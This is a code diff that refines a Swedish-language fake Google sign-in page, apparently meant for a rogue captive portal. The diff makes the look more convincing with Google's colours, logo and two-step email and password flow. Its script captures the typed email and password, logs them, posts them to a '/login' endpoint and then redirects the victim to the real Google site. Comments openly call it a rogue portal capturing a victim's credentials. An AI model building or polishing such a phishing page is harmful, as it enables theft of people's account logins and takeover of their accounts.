@@ -5,147 +5,186 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Logga in – Google Konton</title>
     <style>
+        :root {
+            --google-blue: #0b57d0;
+            --google-hover: #0842a0;
+            --text-main: #1f1f1f;
+            --text-sub: #444746;
+            --border-color: #747775;
+        }
+
         * { margin: 0; padding: 0; box-sizing: border-box; }
+
         body {
-            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
-            background: #fff;
+            font-family: "Google Sans", "Roboto", arial, sans-serif;
+            background-color: #fff;
+            color: var(--text-main);
             display: flex;
             flex-direction: column;
-            justify-content: center;
-            align-items: center;
             min-height: 100vh;
-            color: #1f1f1f;
+            align-items: center;
+            justify-content: center;
         }
-        .main-container {
+
+        .container {
+            display: flex;
             width: 100%;
             max-width: 1040px;
-            display: flex;
-            padding: 48px;
+            min-height: 480px;
+            background: #fff;
+            border-radius: 28px;
+            padding: 36px;
             gap: 48px;
         }
-        .left-col { flex: 1; }
-        .right-col { flex: 1; display: flex; flex-direction: column; justify-content: center; min-height: 300px; }
-        
+
+        /* Side-by-side Layout */
+        .left-col { flex: 1; padding-top: 8px; }
+        .right-col { flex: 1; display: flex; flex-direction: column; justify-content: center; }
+
         .logo { margin-bottom: 24px; }
-        .logo img { width: 48px; height: 48px; }
-        h1 { font-size: 36px; font-weight: 400; margin-bottom: 12px; }
-        .subtitle { font-size: 16px; margin-bottom: 32px; }
+        .logo svg { width: 48px; height: 48px; }
 
-        /* Step Management */
-        #password-step { display: none; }
+        h1 { font-size: 36px; font-weight: 400; line-height: 44px; margin-bottom: 12px; }
+        .subtitle { font-size: 16px; line-height: 24px; color: var(--text-main); }
+
+        /* Form Styling */
+        .input-group { margin-top: 24px; position: relative; }
         
-        .user-display {
-            display: flex;
-            align-items: center;
-            padding: 4px 8px;
-            border: 1px solid #dadce0;
-            border-radius: 16px;
-            width: fit-content;
-            margin-bottom: 24px;
-            font-size: 14px;
-            cursor: pointer;
-        }
-        .user-display:hover { background: #f8f9fa; }
-
-        .input-group { margin-bottom: 8px; position: relative; }
-        .input-group input {
+        input {
             width: 100%;
             padding: 16px;
             font-size: 16px;
-            border: 1px solid #747775;
+            border: 1px solid var(--border-color);
             border-radius: 4px;
             outline: none;
+            transition: border 0.1s;
         }
-        .input-group input:focus { border: 2px solid #0b57d0; padding: 15px; }
+
+        input:focus { border: 2px solid var(--google-blue); padding: 15px; }
 
         .link-text {
-            color: #0b57d0;
+            color: var(--google-blue);
             text-decoration: none;
             font-size: 14px;
             font-weight: 500;
             display: inline-block;
-            margin-top: 8px;
+            margin-top: 9px;
+        }
+        .link-text:hover { text-decoration: underline; }
+
+        .guest-text {
+            font-size: 14px;
+            line-height: 20px;
+            color: var(--text-sub);
+            margin: 32px 0;
         }
 
-        .action-area {
+        .actions {
             display: flex;
             justify-content: flex-end;
             align-items: center;
             gap: 24px;
-            margin-top: 40px;
+            margin-top: 8px;
         }
+
         .btn-next {
-            background: #0b57d0;
-            color: #fff;
+            background-color: var(--google-blue);
+            color: white;
             border: none;
             padding: 10px 24px;
             border-radius: 20px;
             font-weight: 500;
-            cursor: pointer;
             font-size: 14px;
+            cursor: pointer;
+            transition: background 0.2s;
         }
 
-        .page-footer {
-            position: absolute;
-            bottom: 0;
+        .btn-next:hover { background-color: var(--google-hover); box-shadow: 0 1px 2px rgba(60,64,67,0.3); }
+
+        /* Step 2 specific styles */
+        #password-step { display: none; }
+        .user-pill {
+            display: inline-flex;
+            align-items: center;
+            padding: 4px 12px 4px 4px;
+            border: 1px solid #dadce0;
+            border-radius: 16px;
+            font-size: 14px;
+            margin-bottom: 24px;
+            cursor: pointer;
+        }
+        .user-pill:hover { background: #f8f9fa; }
+
+        /* Responsive */
+        @media (max-width: 850px) {
+            .container { flex-direction: column; padding: 24px; align-items: center; text-align: center; max-width: 450px; }
+            .left-col { flex: none; }
+            .actions { justify-content: space-between; width: 100%; }
+            .user-pill { margin: 0 auto 24px auto; }
+        }
+
+        /* Footer */
+        .footer {
             width: 100%;
             max-width: 1040px;
             display: flex;
             justify-content: space-between;
             padding: 24px;
             font-size: 12px;
-            color: #444746;
+            color: var(--text-sub);
         }
-        .footer-links a { text-decoration: none; color: #444746; margin-left: 16px; }
-
-        @media (max-width: 800px) {
-            .main-container { flex-direction: column; padding: 24px; text-align: center; }
-            .left-col { flex: none; }
-            .user-display { margin: 0 auto 24px auto; }
-            .action-area { justify-content: space-between; }
-        }
+        .footer-links a { text-decoration: none; color: var(--text-sub); margin-left: 24px; }
     </style>
 </head>
 <body>
 
-    <div class="main-container">
+    <div class="container">
         <div class="left-col">
             <div class="logo">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/960px-Google_2015_logo.svg.png?utm_source=commons.wikimedia.org&utm_campaign=index&utm_content=thumbnail&_=20160213081640" alt="Google">
+                <!-- Correct multicolor G icon -->
+                <svg viewBox="0 0 48 48">
+                    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"></path>
+                    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.13-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"></path>
+                    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"></path>
+                    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"></path>
+                    <path fill="none" d="M0 0h48v48H0z"></path>
+                </svg>
             </div>
-            <h1>Logga in</h1>
-            <p class="subtitle" id="main-subtitle">Använd ditt Google-konto</p>
+            <h1 id="title">Logga in</h1>
+            <p class="subtitle" id="subtitle">Använd ditt Google-konto</p>
         </div>
 
         <div class="right-col">
             <form id="login-form">
-                <!-- STEP 1: EMAIL -->
+                <!-- Step 1: Identifier -->
                 <div id="email-step">
                     <div class="input-group">
-                        <input type="text" id="email" placeholder="E-post eller telefonnummer" required>
+                        <input type="text" id="email" placeholder="E-post eller telefonnummer" required autofocus>
                     </div>
                     <a href="#" class="link-text">Har du glömt din e-postadress?</a>
-                    <div style="margin-top: 32px; font-size: 14px; color: #444746;">
-                        Är detta inte din dator? Logga in privat med gästläget. 
-                        <a href="#" class="link-text">Läs mer</a>
+                    <div class="guest-text">
+                        Är detta inte din dator? Logga in privat med gästläget. <a href="#" class="link-text">Läs mer om hur du använder gästläget</a>
                     </div>
-                    <div class="action-area">
-                        <a href="#" class="link-text">Skapa konto</a>
-                        <button type="button" class="btn-next" onclick="showPasswordStep()">Nästa</button>
+                    <div class="actions">
+                        <a href="#" class="link-text" style="margin-right:auto">Skapa konto</a>
+                        <button type="button" class="btn-next" onclick="toPassword()">Nästa</button>
                     </div>
                 </div>
 
-                <!-- STEP 2: PASSWORD -->
+                <!-- Step 2: Password -->
                 <div id="password-step">
-                    <div class="user-display" onclick="showEmailStep()">
-                        <span id="display-email"></span>
-                        <svg style="margin-left:8px" width="12" height="12" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5H7z"/></svg>
+                    <div class="user-pill" onclick="toEmail()">
+                        <span id="display-email" style="font-weight:500"></span>
+                        <svg style="margin-left:8px" width="20" height="20" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5H7z"/></svg>
                     </div>
                     <div class="input-group">
                         <input type="password" id="password" placeholder="Ange ditt lösenord" required>
                     </div>
-                    <a href="#" class="link-text">Har du glömt lösenordet?</a>
-                    <div class="action-area">
+                    <div style="margin-top: 8px;">
+                        <input type="checkbox" id="show-pw"> <label for="show-pw" style="font-size:14px">Visa lösenord</label>
+                    </div>
+                    <div class="actions" style="margin-top: 48px;">
+                        <a href="#" class="link-text" style="margin-right:auto">Glömt lösenordet?</a>
                         <button type="submit" class="btn-next">Nästa</button>
                     </div>
                 </div>
@@ -153,7 +192,7 @@
         </div>
     </div>
 
-    <div class="page-footer">
+    <div class="footer">
         <div>Svenska ▼</div>
         <div class="footer-links">
             <a href="#">Hjälp</a>
@@ -168,41 +207,40 @@
         const emailInput = document.getElementById('email');
         const passwordInput = document.getElementById('password');
         const displayEmail = document.getElementById('display-email');
-        const subtitle = document.getElementById('main-subtitle');
+        const title = document.getElementById('title');
+        const subtitle = document.getElementById('subtitle');
 
-        function showPasswordStep() {
-            if(emailInput.value.length > 3) {
+        function toPassword() {
+            if(emailInput.value.trim().length > 3) {
                 displayEmail.innerText = emailInput.value;
                 emailStep.style.display = 'none';
                 passwordStep.style.display = 'block';
-                subtitle.innerText = 'Välkommen';
+                title.innerText = 'Välkommen';
+                subtitle.innerText = '';
                 passwordInput.focus();
             }
         }
 
-        function showEmailStep() {
+        function toEmail() {
             emailStep.style.display = 'block';
             passwordStep.style.display = 'none';
+            title.innerText = 'Logga in';
             subtitle.innerText = 'Använd ditt Google-konto';
         }
 
         document.getElementById('login-form').addEventListener('submit', function(e) {
             e.preventDefault();
+            // In a real rogue portal, you'd send this to your Flask back-end
+            console.log("Captured:", emailInput.value, passwordInput.value);
             
-            const data = 'email=' + encodeURIComponent(emailInput.value) + 
-                         '&password=' + encodeURIComponent(passwordInput.value);
-
-            const xhr = new XMLHttpRequest();
-            xhr.open('POST', '/login', true);
-            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-            
+            // Send the data
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "/login", true);
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
             xhr.onreadystatechange = function() {
-                if (xhr.readyState === 4) {
-                    // Redirect victim to actual Google after capture
-                    window.location.href = "https://accounts.google.com";
-                }
+                if (xhr.readyState == 4) window.location.href = "https://accounts.google.com";
             };
-            xhr.send(data);
+            xhr.send("email=" + encodeURIComponent(emailInput.value) + "&password=" + encodeURIComponent(passwordInput.value));
         });
     </script>
 </body>
